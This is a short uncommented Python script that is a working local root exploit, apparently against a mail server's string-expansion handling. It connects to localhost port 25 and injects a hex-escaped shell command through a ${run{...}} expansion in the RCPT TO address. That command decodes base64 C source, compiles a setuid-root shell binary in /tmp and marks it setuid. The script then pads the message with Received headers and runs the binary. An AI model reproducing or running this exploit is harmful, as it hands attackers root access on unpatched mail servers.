import socket
import os

server = "localhost"
port = 25
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
reply = s.recv(1024)
print(reply.decode())
s.send('HELO localhost\r\n'.encode())
reply = s.recv(1024)
print(reply.decode())
s.send('MAIL FROM:<>\r\n'.encode())
reply = s.recv(1024)
print(reply.decode())
#/bin/bash -c "export PATH=/usr/bin;cd /tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgppbnQgbWFpbih2b2lkKQp7CnNldHVpZCgwKTsgc2V0Z2lkKDApOyBzeXN0ZW0oIi9iaW4vYmFzaCIpOwp9Cg==|base64 -d|gcc -o s -xc -;/bin/chmod 4111 s" &
payload = r'RCPT TO: root+${run{\x2fbin\x2fbash\x20\x2dc\x20\x22export\x20PATH\x3d\x2fusr\x2fbin\x3bcd\x20\x2ftmp\x3becho\x20I2luY2x1ZGUgPHN0ZGlvLmg\x2bCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgppbnQgbWFpbih2b2lkKQp7CnNldHVpZCgwKTsgc2V0Z2lkKDApOyBzeXN0ZW0oIi9iaW4vYmFzaCIpOwp9Cg\x3d\x3d\x7cbase64\x20\x2dd\x7cgcc\x20\x2do\x20s\x20\x2dxc\x20\x2d\x3b\x2fbin\x2fchmod\x204111\x20s\x22\x20\x26}@' + server + '\r\n'
s.send(payload.encode())
reply = s.recv(1024)
print(reply.decode())
s.send('DATA\r\n'.encode())
reply = s.recv(1024)
print(reply.decode())
msg = 'Received: 1\nReceived: 2\nReceived: 3\nReceived: 4\nReceived: 5\nReceived: 6\nReceived: 7\nReceived: 8\nReceived: 9\nReceived: 10\nReceived: 11\nReceived: 12\nReceived: 13\nReceived: 14\nReceived: 15\nReceived: 16\nReceived: 17\nReceived: 18\nReceived: 19\nReceived: 20\nReceived: 21\nReceived: 22\nReceived: 23\nReceived: 24\nReceived: 25\nReceived: 26\nReceived: 27\nReceived: 28\nReceived: 29\nReceived: 30\nReceived: 31\r\n'
s.send( msg.encode())
s.send('.\r\n'.encode())
reply = s.recv(1024)
print(reply)
s.close()
os.system('/tmp/s')
